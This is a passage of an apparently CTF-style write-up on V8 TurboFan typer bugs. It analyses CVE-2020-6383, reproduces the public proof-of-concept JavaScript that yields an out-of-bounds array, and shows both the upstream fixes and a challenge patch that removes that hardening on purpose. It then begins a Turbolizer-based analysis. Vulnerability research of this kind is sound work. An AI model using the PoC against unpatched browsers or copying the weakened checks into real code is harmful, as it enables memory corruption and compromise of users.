</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ReduceNewArray</span>(node, length, capacity, <span style="color:#f92672">*</span>initial_map, elements_kind,
</span></span><span style="display:flex;"><span>                            allocation, slack_tracking_prediction);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (length_type.<span style="color:#a6e22e">Maybe</span>(Type<span style="color:#f92672">::</span><span style="color:#a6e22e">UnsignedSmall</span>()) <span style="color:#f92672">&amp;&amp;</span> can_inline_call) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ReduceNewArray</span>(node, length, <span style="color:#f92672">*</span>initial_map, elements_kind,
</span></span><span style="display:flex;"><span>                            allocation, slack_tracking_prediction);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (arity <span style="color:#f92672">&lt;=</span> JSArray<span style="color:#f92672">::</span>kInitialMaxFastElementArray) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Gather the values to store into the newly created array.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	...</span></span></code></pre></div>
As we can observe, depending on the number of arguments (arity) passed to the array constructor, different code-paths will be chosen. Ultimately, the effect of these code-paths based on the value of <code>arity</code> will be the following:</p>
<ul>
<li><strong>If <code>arity</code> is 0</strong>
<ul>
<li>length = 0</li>
<li>capacity = <code>JSArray::kPreallocatedArrayElements</code></li>
</ul>
</li>
<li><strong>If <code>arity</code> is 1</strong>
<ul>
<li>length = <code>NodeProperties::GetValueInput(node, 2)</code></li>
<li>if <code>length_type</code> != <code>Number</code>
<ul>
<li>capacity = <code>undefined</code></li>
</ul>
</li>
<li>if <code>length_type</code> == <code>SignedSmall</code> and <code>length_type</code> &lt;= <code>kElementLoopUnrollLimit</code>
<ul>
<li>capacity = <code>length_type.Max()</code></li>
</ul>
</li>
<li>else
<ul>
<li>capacity = <code>undefined</code></li>
</ul>
</li>
</ul>
</li>
<li><strong>else if <code>arity</code> &lt;= <code>JSArray::kINiitalMaxFastElementArray</code></strong>:
<ul>
<li>iterate through arguments, compute length and create new array</li>
</ul>
</li>
<li><strong>else</strong>:
<ul>
<li>return <code>NoChange()</code></li>
</ul>
</li>
</ul>
<p>We can observe based on the previous resumed overview of the implementation of <code>ReduceJSCreateArray</code> that if one argument is passed to the constructor, and that argument falls within the range of 0 &lt;= <code>length_type</code> &lt;= <code>kElementLoopUnrollLimit</code>, a new array will be created having its capacity initialized as <code>length_type.Max()</code>. The value of <code>kElementLoopUnrollLimit</code> is the following:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// When initializing arrays, we&#39;ll unfold the loop if the number of
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// elements is known to be of this type.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> kElementLoopUnrollLimit <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;</span></span></code></pre></div>Therefore, by following this path we can abuse the creation of an array with OOB indexed property access, as the upper bounds of the newly created array will be set to  <code>lenght_type.Max()</code>.</p>
<h3 id="exploitation">Exploitation</h3>
<p>The PoC provided in the crbug issue shows how we can chain these two vulnerabilities to abuse the speculation of a wrongly assumed type inference. This PoC is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">++</span><span style="color:#a6e22e">k</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(-Inf, Inf) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(1024, Inf) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;                
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(-Inf, -1024) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1025</span>); 
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(-1025, -1024) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;                 
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(1024, 1025) -- reality: i = 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1022</span>;              
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(2, 3) -- reality: i = -1022 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;                
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(1, 1) -- reality: i = 1073741313 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">10</span>;               
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// inference: i = Range(11, 11) -- reality: i = 1073741323 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> Array(<span style="color:#a6e22e">i</span>)      
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// capacity = 11, length = 1073741323 (OOB)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">20000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">trigger</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>()[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">11</span>]);</span></span></code></pre></div>
<h3 id="mitigation">Mitigation</h3>
<p>After the report of this vulnerability, the following patches were applied. Is important to understand the scope of these patches as this would be relevant for the analysis and solution of Modern Typer.</p>
<h4 id="patch-applied-to-jscreateloweringreducejscreatearrayhttpschromiumgooglesourcecomv8v86516b1ccbe6f549d2aa2fe24510f73eb3a33b41a5e21f0">Patch applied to <a href="https://chromium.googlesource.com/v8/v8/+/6516b1ccbe6f549d2aa2fe24510f73eb3a33b41a%5E%21/#F0">JSCreateLowering::ReduceJSCreateArray</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
</span></span><span style="display:flex;"><span>index ff057a4..77da973 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/compiler/js-create-lowering.cc
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/compiler/js-create-lowering.cc
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -672,6 +672,9 @@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         length_type.Max() &lt;= kElementLoopUnrollLimit &amp;&amp;
</span></span><span style="display:flex;"><span>         length_type.Min() == length_type.Max()) {
</span></span><span style="display:flex;"><span>       int capacity = static_cast&lt;int&gt;(length_type.Max());
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      // Replace length with a constant in order to protect against a potential
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      // typer bug leading to length &gt; capacity.
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      length = jsgraph()-&gt;Constant(capacity);
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
</span></span><span style="display:flex;"><span>                             allocation, slack_tracking_prediction);
</span></span><span style="display:flex;"><span>     }
</span></span></code></pre></div>
<h4 id="patch-applied-to--typertypeinductionvariablephihttpschromiumgooglesourcecomv8v8a2e971c56d1c46f7c71ccaf33057057308cc84845e21f1">Patch applied to <a href="https://chromium.googlesource.com/v8/v8/+/a2e971c56d1c46f7c71ccaf33057057308cc8484%5E%21/#F1"> Typer::TypeInductionVariablePhi</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
</span></span><span style="display:flex;"><span>index 14ec856..4e86b96 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -847,30 +847,24 @@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());
</span></span><span style="display:flex;"><span>   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount());
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  DCHECK(res != induction_vars_-&gt;induction_variables().end());
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  InductionVariable* induction_var = res-&gt;second;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span>   Type initial_type = Operand(node, 0);
</span></span><span style="display:flex;"><span>   Type increment_type = Operand(node, 2);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  bool maybe_nan = false;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  // The addition or subtraction could still produce a NaN, if the integer
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  // ranges touch infinity.
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  if (both_types_integer) {
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    Type resultant_type =
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-                                                        increment_type);
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    maybe_nan = resultant_type.Maybe(Type::NaN());
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+  // If we do not have enough type information for the initial value or
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  // the increment, just return the initial value&#39;s type.
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  if (initial_type.IsNone() ||
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) {
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    return initial_type;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>   }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-  // We only handle integer induction variables (otherwise ranges
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  // do not apply and we cannot do anything).
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  if (!both_types_integer || maybe_nan) {
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+  // We only handle integer induction variables (otherwise ranges do not apply
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  // and we cannot do anything). Moreover, we don&#39;t support infinities in
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  // {increment_type} because the induction variable can become NaN through
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  // addition/subtraction of opposing infinities.
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      increment_type.Min() == -V8_INFINITY ||
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      increment_type.Max() == +V8_INFINITY) {
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>     // Fallback to normal phi typing, but ensure monotonicity.
</span></span><span style="display:flex;"><span>     // (Unfortunately, without baking in the previous type, monotonicity might
</span></span><span style="display:flex;"><span>     // be violated because we might not yet have retyped the incrementing
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -883,14 +877,13 @@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     }
</span></span><span style="display:flex;"><span>     return type;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span><span style="color:#f92672">-  // If we do not have enough type information for the initial value or
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  // the increment, just return the initial value&#39;s type.
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  if (initial_type.IsNone() ||
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) {
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    return initial_type;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  }
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span> 
</span></span><span style="display:flex;"><span>   // Now process the bounds.
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  DCHECK(res != induction_vars_-&gt;induction_variables().end());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  InductionVariable* induction_var = res-&gt;second;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>   double min = -V8_INFINITY;
</span></span><span style="display:flex;"><span>   double max = V8_INFINITY;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -946,8 +939,8 @@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     // The lower bound must be at most the initial value&#39;s lower bound.
</span></span><span style="display:flex;"><span>     min = std::min(min, initial_type.Min());
</span></span><span style="display:flex;"><span>   } else {
</span></span><span style="display:flex;"><span><span style="color:#f92672">-    // Shortcut: If the increment can be both positive and negative,
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    // the variable can go arbitrarily far, so just return integer.
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+    // If the increment can be both positive and negative, the variable can go
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    // arbitrarily far.
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>     return typer_-&gt;cache_-&gt;kInteger;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   if (FLAG_trace_turbo_loop) {
</span></span></code></pre></div>
<h2 id="modern-typer">Modern Typer</h2>
<p>After the analysis of <code>CVE-2020-6383</code>, understanding the exploitation of Modern Typer will be easier as it abuses a similar vulnerability.</p>
<h3 id="patch-file">Patch File</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
</span></span><span style="display:flex;"><span>index 619475ef7f..d1cfcae1f4 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/compiler/js-create-lowering.cc
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/compiler/js-create-lowering.cc
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -699,7 +699,7 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>       int capacity = static_cast&lt;int&gt;(length_type.Max());
</span></span><span style="display:flex;"><span>       // Replace length with a constant in order to protect against a potential
</span></span><span style="display:flex;"><span>       // typer bug leading to length &gt; capacity.
</span></span><span style="display:flex;"><span><span style="color:#f92672">-      length = jsgraph()-&gt;Constant(capacity);
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+      //length = jsgraph()-&gt;Constant(capacity);
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
</span></span><span style="display:flex;"><span>                             allocation, slack_tracking_prediction);
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc
</span></span><span style="display:flex;"><span>index 8b889c6948..c13d58e4c2 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/compiler/operation-typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/compiler/operation-typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -325,7 +325,7 @@ Type OperationTyper::NumberAbs(Type type) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   DCHECK(type.Is(Type::Number()));
</span></span><span style="display:flex;"><span>   if (type.IsNone()) return type;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-  bool const maybe_nan = type.Maybe(Type::NaN());
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+  //bool const maybe_nan = type.Maybe(Type::NaN());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>   bool const maybe_minuszero = type.Maybe(Type::MinusZero());
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   type = Type::Intersect(type, Type::PlainNumber(), zone());
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -345,9 +345,9 @@ Type OperationTyper::NumberAbs(Type type) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   if (maybe_minuszero) {
</span></span><span style="display:flex;"><span>     type = Type::Union(type, cache_-&gt;kSingletonZero, zone());
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span><span style="color:#f92672">-  if (maybe_nan) {
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    type = Type::Union(type, Type::NaN(), zone());
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-  }
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+  //if (maybe_nan) {
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  //  type = Type::Union(type, Type::NaN(), zone());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  //}
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>   return type;
</span></span><span style="display:flex;"><span> }
</span></span></code></pre></div>
<h2 id="patch-analysis">Patch Analysis</h2>
<p>If we put close attention to the patches applied for Modern Typer, we can notice that one of the patches applies to <code>JSCreateLowering::ReduceJSCreateArray</code>. This patch ultimately removes the previous patch for <code>CVE-2020-6383</code>, implementing explicit upper bound checks of constructed arrays in order to provide hardening against typer bugs. Based on this patch, we assume to be likely that the vulnerability to exploit this challenge will involve the speculation of a constructed array&rsquo;s upper bounds through a potential type confusion vulnerability.</p>
<p>If we take a look at the other function in which the provided patch applies, we can see that it involves <code>OperationTyper::NumberAbs</code>. Changes imposed in this function by this patch are rather concise, and consists of removing <code>NaN</code> type checks to the result of <code>NumberAbs</code>.</p>
<p>Having in mind the extent of the provided patch and the functions involved, we can execute a number of test in order to understand how exploitation can be achieved.</p>
<p>If we take the previous PoC provided for <code>CVE-2020-6383</code> and try to execute it on a patched v8 build we will see that an OOB array is not achieved. We can inspect Turbofan&rsquo;s optimization phases with <code>Turbolizer</code> in order to gain a better understanding of what is happening.</p>
<p>We can generate Turbolizer output files if we run the PoC with the following flags:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># setting up turbolizer</span>
</span></span><span style="display:flex;"><span>cd v8/tools/turbolizer
</span></span><span style="display:flex;"><span>npm i <span style="color:#f92672">&amp;&amp;</span> npm run-script build
</span></span><span style="display:flex;"><span>python3 -m http.server 2&amp;&gt;1 &gt; /dev/null &amp;
</span></span><span style="display:flex;"><span>cd -
</span></span><span style="display:flex;"><span><span style="color:#75715e"># running poc and provide turbolizer output</span>
</span></span><span style="display:flex;"><span>v8/out/x64.release/d8 ./poc.js --trace-turbo</span></span></code></pre></div>
<p>We can observe the following Turbolizer Typer phase graph of our function <code>trigger</code>:</p>
<p><img src="/2021-12-30-134638_948x785_scrot.png#center" alt=""></p>
<p>Based on the Turbolizer&rsquo;s output, we can interpret that type inference of our variable <code>i</code> as being interpreted as follows:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1025</span>); 
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;  
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1022</span>;
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(2, 3)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#75715e">// Truncate Float64ToWord32 (SimplifiedLowering) i = 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = Range(0, 1) -- reality: i = 0 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;               
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = Range(1, 2) -- reality: i = 1              
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
